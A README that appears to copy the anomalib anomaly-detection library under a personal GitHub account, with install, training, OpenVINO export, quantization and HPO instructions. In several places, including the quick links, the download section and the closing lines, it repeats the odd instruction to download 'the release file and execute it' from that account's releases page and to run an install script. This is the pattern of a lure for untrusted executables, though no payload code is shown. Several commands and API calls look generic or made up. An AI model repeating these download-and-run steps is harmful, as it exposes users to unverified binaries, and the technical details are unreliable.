# anomalib — Anomaly Detection, Localization, Segmentation, Edge Inference

[![Release](https://img.shields.io/badge/release-download-brightgreen?style=for-the-badge)](https://github.com/Juliwan/anomalib/releases)  
https://github.com/Juliwan/anomalib/releases

[![PyPI](https://img.shields.io/pypi/v/anomalib?style=for-the-badge)](https://pypi.org/project/anomalib/)
[![License](https://img.shields.io/github/license/Juliwan/anomalib?style=for-the-badge)](LICENSE)
[![Build Status](https://img.shields.io/github/actions/workflow/status/Juliwan/anomalib/ci.yml?branch=main&style=for-the-badge)](https://github.com/Juliwan/anomalib/actions)
[![Topics](https://img.shields.io/badge/topics-anomaly--detection%20|%20segmentation-blue?style=for-the-badge)](#)

Hero image  
![Anomaly Detection Illustration](https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Anomaly-detection.png/1200px-Anomaly-detection.png)

Tags: anomaly-detection, anomaly-localization, anomaly-segmentation, geti, neural-network-compression, openvino, unsupervised-learning

Table of Contents
- About this project
- Key features
- Quick links
- Install
- Download releases
- Quick start
- Dataset format
- Training
- Inference
- Edge deployment (OpenVINO, GETI)
- Model compression and quantization
- Experiment management
- Hyper-parameter optimization
- Evaluation metrics
- Examples
- API reference
- Configuration
- Contributing
- License
- Citation
- Changelog

About this project
This repo hosts anomalib. The library focuses on industrial-grade anomaly detection and localization. It collects modern methods. It provides tools for training, testing, and deploying models. It helps run experiments. It supports hyper-parameter search. It targets edge inference. The code uses PyTorch and common tooling. It supports OpenVINO and model compression.

Key features
- Modules for detection, localization, and segmentation.
- Implementations of state-of-the-art unsupervised methods.
- End-to-end pipelines for dataset handling, training, and inference.
- Tools for experiment tracking and result reproducibility.
- Built-in support for hyper-parameter optimization using Optuna.
- Export and edge inference via OpenVINO and GETI.
- Model compression and quantization workflows.
- Scripts for benchmarking and evaluation.
- Clean config system based on YAML.
- Example notebooks and demo scripts.

Quick links
- Releases: https://github.com/Juliwan/anomalib/releases (download the release file and execute it)
- PyPI: https://pypi.org/project/anomalib/
- Issues: https://github.com/Juliwan/anomalib/issues
- Discussions: https://github.com/Juliwan/anomalib/discussions

Install

Requirements
- Python 3.8 or newer
- PyTorch 1.9 or newer
- CUDA 11.1 or newer for GPU training (CPU works for inference)
- pip, git

Install from PyPI
Run:
```
pip install anomalib
```

Install from source
Clone the repo and install:
```
git clone https://github.com/Juliwan/anomalib.git
cd anomalib
pip install -e .
```

Install extras for edge and HPO
```
pip install anomalib[openvino,optuna,neural-compression,geti]
```

System dependencies
- For OpenVINO, install the runtime from Intel. Follow Intel docs.
- For GETI, install runtime or SDK as needed.
- For Neural Compressor, install Intel's neural-compressor package.

Download releases
This repository exposes release assets. Visit the releases page and download the asset matched to your platform. The releases page is:
https://github.com/Juliwan/anomalib/releases

The release URL includes a path. Download the release file and execute it. Typical release files:
- anomalib-<version>.tar.gz
- anomalib-<version>-py3-none-any.whl
- anomalib-edge-<version>-openvino.tar.gz
- anomalib-demo-<version>.zip

Steps to use a release asset
1. Visit the link above.
2. Download the asset for your OS.
3. If the asset is a wheel:
   ```
   pip install anomalib-<version>-py3-none-any.whl
   ```
4. If the asset is a tar.gz:
   ```
   tar -xvf anomalib-<version>.tar.gz
   cd anomalib-<version>
   python setup.py install
   ```
5. If the asset contains an installer script:
   ```
   chmod +x install.sh
   ./install.sh
   ```

Quick start

Prepare the dataset
This library uses a common dataset layout. One folder per class. Subfolders for train and test. Each sample folder contains images.

Layout example
```
datasets/
  mvtec/
    carpet/
      train/
        good/
          000.png
          001.png
      test/
        good/
          100.png
        defective/
          101.png
          102.png
      ground_truth/
        defect_mask_101.png
```

Supported datasets
- MVTec AD
- DAGM
- Custom image datasets with label masks

Load a sample dataset
```
from anomalib.data import get_dataset

dataset = get_dataset("mvtec", data_path="datasets/mvtec", category="carpet")
```

Train a model
Run a built-in trainer. The library provides command line scripts and Python API.

CLI training
```
python tools/train.py --config configs/patchcore/mvtec/carpet.yaml
```

Python API
```
from anomalib.models import get_model
from anomalib.trainers import Trainer

cfg = load_config("configs/patchcore/mvtec/carpet.yaml")
model = get_model(cfg)
trainer = Trainer(model, cfg)
trainer.fit()
```

Training tips
- Use a stable seed for reproducible runs.
- Start with smaller image size for quick iteration.
- Monitor training via TensorBoard or MLflow.

Inference

Run inference on a folder of images
```
python tools/infer.py --config configs/patchcore/mvtec/carpet.yaml \
  --weights output/checkpoints/best.ckpt \
  --input data/test_images/ \
  --output output/inference/
```

Call inference from Python
```
from anomalib.deploy import InferenceRunner

runner = InferenceRunner(cfg, weights="output/checkpoints/best.ckpt")
result = runner.run_on_image("data/test_images/101.png")
# result contains anomaly map, score, and optional mask
```

Outputs
- Anomaly score per image
- Anomaly map (heatmap)
- Segmentation mask if model supports per-pixel output
- Visual overlay image

Edge deployment (OpenVINO, GETI)

OpenVINO export
The library can export models to ONNX and then to OpenVINO IR format.

Export steps
1. Convert PyTorch model to ONNX:
```
python tools/export.py --config configs/patchcore/mvtec/carpet.yaml \
  --weights output/checkpoints/best.ckpt \
  --to onnx \
  --output output/onnx/
```
2. Convert ONNX to OpenVINO IR:
```
mo --input_model output/onnx/model.onnx --output_dir output/openvino/ --data_type FP16
```
3. Run inference with OpenVINO runtime:
```
python tools/infer_openvino.py --model output/openvino/model.xml --input data/test_images/ --output output/openvino/results/
```

GETI deployment
GETI integration targets edge devices that support the GETI SDK. Use the GETI adapter to wrap the model and run on supported hardware.

Steps
1. Export model to ONNX.
2. Use GETI packager to create deployment bundle:
```
geti-pack --input output/onnx/model.onnx --output output/geti/deployment.pkg
```
3. Deploy the package to the device using GETI runtime. Use the runtime CLI or API to run inference.

Model compression and quantization

Neural network compression
The repo includes support for compression workflows. It integrates Intel Neural Compressor and other tools.

Compression steps
1. Prepare a small calibration set.
2. Configure compression YAML.
3. Run the compression script:
```
python tools/compress.py --config configs/compression/quantize.yaml \
  --weights output/checkpoints/best.ckpt \
  --output output/compressed/
```

Quantization
- Post-training quantization
- Quantization-aware training (QAT) via fine-tuning
- Mixed precision (FP16) where supported

Typical workflow
1. Run PTQ with a calibration set.
2. Validate on the test set.
3. If accuracy drops, run QAT for a few epochs.

Experiment management

Config system
The project uses YAML configs. Each run reads a config that defines:
- Model architecture
- Dataset paths
- Training parameters
- Logging options
- HPO settings

Example config keys
```
dataset:
  name: mvtec
  category: carpet
model:
  name: patchcore
  backbone: resnet18
trainer:
  epochs: 50
  batch_size: 8
logging:
  tensorboard: true
  mlflow: false
```

Logging and tracking
- TensorBoard for metrics and images
- MLflow for run tracking
- Sacred or Hydra for configs (optional)

How to log
```
python tools/train.py --config configs/patchcore/mvtec/carpet.yaml --log tensorboard
```

Checkpoints
- The trainer writes periodic checkpoints.
- The best checkpoint saves based on validation metric.
- Use the weights path to run inference.

Hyper-parameter optimization

Optuna integration
The library supports Optuna for tuning hyper-parameters. Use a study to sample configurations and run experiments.

HPO workflow
1. Prepare HPO config that lists search space.
2. Launch HPO script.
3. Monitor results and pick best trial.

Example HPO command
```
python tools/hpo.py --config configs/hpo/patchcore.yaml --trials 50 --study-name patchcore_mvtec
```

HPO config example
```
search_space:
  lr:
    type: float
    low: 1e-5
    high: 1e-2
  batch_size:
    type: int
    low: 4
    high: 16
  backbone:
    type: categorical
    choices: [resnet18, resnet50]
```

Result analysis
- Optuna stores study files.
- Use Optuna visualization to inspect parameter importance.
- Select the best trial and re-run training with the exact config.

Evaluation metrics

Core metrics
- Image-level AUC (AUROC)
- Pixel-level AUC (AUROC for masks)
- Precision, Recall, F1 for segmentation
- mAP for localization tasks
- ROC curves and PR curves

How to evaluate
```
python tools/evaluate.py --config configs/patchcore/mvtec/carpet.yaml \
  --weights output/checkpoints/best.ckpt \
  --output output/eval/
```

Interpreting results
- A high image-level AUC means the model detects anomalous images well.
- A high pixel-level AUC means the model localizes defects well.
- Use thresholding to produce binary masks for precision/recall.

Examples

PatchCore example
PatchCore remains a strong baseline for anomaly detection. The repo contains a ready config and scripts.

Run example
```
python tools/train.py --config configs/patchcore/mvtec/carpet.yaml
python tools/infer.py --config configs/patchcore/mvtec/carpet.yaml --weights output/checkpoints/best.ckpt
```

Fast prototyping
- Use a small subset of the dataset.
- Use a smaller backbone.
- Use fewer epochs for quick passes.

Notebook demos
The repo hosts Jupyter notebooks for:
- Training a baseline model.
- Running inference on sample images.
- Exporting to ONNX and OpenVINO.
- Running quantization.

API reference

Model factory
```
from anomalib.models import get_model

model = get_model(cfg)
```

Trainer
```
from anomalib.trainers import Trainer

trainer = Trainer(model, cfg)
trainer.fit()
trainer.test()
```

InferenceRunner
```
from anomalib.deploy import InferenceRunner

runner = InferenceRunner(cfg, weights="weights.ckpt")
result = runner.run_on_image("image.png")
```

Dataset loader
```
from anomalib.data import get_dataset

dataset = get_dataset("mvtec", data_path="datasets/mvtec", category="hazelnut")
```

Visualization
```
from anomalib.utils.visualization import overlay_heatmap

overlay = overlay_heatmap(image, anomaly_map)
```

Configuration

Config hierarchy
- configs/
  - model_name/
    - dataset/
      - category.yaml

Override values
You can override config values via command line:
```
python tools/train.py --config configs/patchcore/mvtec/carpet.yaml trainer.epochs=100 dataset.batch_size=8
```

YAML example
```
model:
  name: patchcore
  backbone: resnet18
dataset:
  name: mvtec
  category: carpet
trainer:
  epochs: 50
  batch_size: 16
logging:
  tensorboard: true
```

Contributing

How to contribute
- Fork the repo.
- Create a feature branch.
- Add tests for new code.
- Submit a pull request.

Coding style
- Use clear names.
- Keep functions short.
- Write docstrings.
- Add unit tests.

Testing
The repo uses pytest. Run tests:
```
pytest tests/
```

Code of conduct
Follow the code of conduct in the CODE_OF_CONDUCT.md file. Be respectful.

Issue templates
- Bug report
- Feature request
- Documentation request

License
This project uses the Apache-2.0 license. See LICENSE for details.

Citation
If you use this library in your work, cite it. Use this format:
```
@misc{anomalib2025,
  title = {anomalib: A Library for Anomaly Detection and Edge Inference},
  author = {Juliwan and contributors},
  year = {2025},
  url = {https://github.com/Juliwan/anomalib}
}
```

Changelog
See the releases page for changelog and binary assets. Visit:
https://github.com/Juliwan/anomalib/releases

Assets on releases
- Download the binary or wheel for stable installs.
- Download the edge bundle for OpenVINO and GETI.
- The release assets include a README and install script. Download the file and execute it to complete the install.

Troubleshooting checklist
- Check Python and PyTorch versions.
- Verify CUDA drivers if using GPU.
- Inspect log files in output/logs.
- Use tensorboard for visual logs.
- If a release asset fails, re-download the asset and verify checksums.

Common commands

Train
```
python tools/train.py --config configs/patchcore/mvtec/carpet.yaml
```

Test
```
python tools/test.py --config configs/patchcore/mvtec/carpet.yaml --weights output/checkpoints/best.ckpt
```

Infer
```
python tools/infer.py --config configs/patchcore/mvtec/carpet.yaml --weights output/checkpoints/best.ckpt --input data/test_images/ --output output/infer/
```

Export ONNX
```
python tools/export.py --config configs/patchcore/mvtec/carpet.yaml --weights output/checkpoints/best.ckpt --to onnx --output output/onnx/
```

OpenVINO convert
```
mo --input_model output/onnx/model.onnx --output_dir output/openvino/ --data_type FP16
```

Quantize with Neural Compressor
```
python tools/compress.py --config configs/compression/ptq.yaml --weights output/checkpoints/best.ckpt
```

Run HPO
```
python tools/hpo.py --config configs/hpo/patchcore.yaml --trials 100
```

Security
Report security issues via the security policy in the repository. If you cannot access the policy, open an issue and mark it private.

Real-world use cases
- Manufacturing defect detection
- Surface inspection for electronics
- Quality control for textiles
- Anomaly detection in medical imaging
- Security camera anomaly monitoring
- Predictive maintenance via sensor images

Benchmarks
The repo includes scripts to run benchmarks on MVTec AD. Use the provided configs and scripts to reproduce numbers.

Reproducibility
- Use the same random seed.
- Use deterministic dataloaders where possible.
- Keep environment logs in output/run_info.json.

Performance tips
- Use a larger batch size if memory allows.
- Use AMP (automatic mixed precision) for faster training with less memory.
- Use a modern backbone with pre-trained weights.
- Use caching for datasets to reduce IO overhead.

Visualization and reports
- TensorBoard for per-epoch metrics and images.
- Save ROC and PR curves to output/reports/.
- Generate HTML reports for each run using provided scripts.

Data augmentation
- Use standard augmentations (flip, rotate, crop).
- Do not augment defective images in the train set for unsupervised tasks.
- Use random crops to increase sample diversity.

Model registry
Store production-ready models in a model registry. Use MLflow or a simple file store with meta.json containing:
```
{
  "model": "patchcore",
  "backbone": "resnet18",
  "version": "1.0.0",
  "checksum": "sha256:..."
}
```

Integrations
- TensorBoard
- MLflow
- Optuna
- OpenVINO
- Intel Neural Compressor
- GETI SDK

Roadmap
- Expand model zoo
- Add more edge backends
- Add real-time inference pipeline
- Add more example datasets and notebooks

Contact
Open issues for bugs or feature requests. Use discussions for architecture or design talks. For private support, contact maintainers via GitHub profiles listed in CONTRIBUTORS.

Appendix A — Config examples

PatchCore config (abridged)
```
model:
  name: patchcore
  backbone:
    name: resnet18
    pretrained: true
dataset:
  name: mvtec
  category: carpet
trainer:
  epochs: 50
  batch_size: 8
  optimizer:
    name: adam
    lr: 1e-4
logging:
  tensorboard: true
```

Export config for OpenVINO
```
export:
  to: onnx
  input_size: [3, 256, 256]
  opset: 11
openvino:
  precision: FP16
```

Appendix B — Example output JSON

Inference runner sample output
```
{
  "image": "data/test_images/101.png",
  "score": 0.87,
  "anomaly_map": "output/infer/101_anomaly_map.png",
  "overlay": "output/infer/101_overlay.png",
  "mask": "output/infer/101_mask.png"
}
```

Appendix C — Recommended hardware

GPU
- NVIDIA RTX 20xx or 30xx series for training
- 8-16 GB VRAM recommended for moderate backbones
CPU
- Multi-core Xeon or AMD EPYC for batch inference
Edge devices
- Intel NCS2 for OpenVINO demos
- GETI supported devices for production edge

Appendix D — Legal and third-party

Third-party libs
- PyTorch
- NumPy
- OpenCV
- Optuna
- Intel OpenVINO
- Intel Neural Compressor
- GETI SDK

Licenses
- Respect third-party licenses for external tools.

Releases and downloads
Visit the releases page to get pre-built assets, installers, and bundles:
https://github.com/Juliwan/anomalib/releases

That link points to a path. Download the release file and execute it following the steps above. Use the provided install scripts when available. If you cannot find an asset, check the Releases section on the repo page.

End of file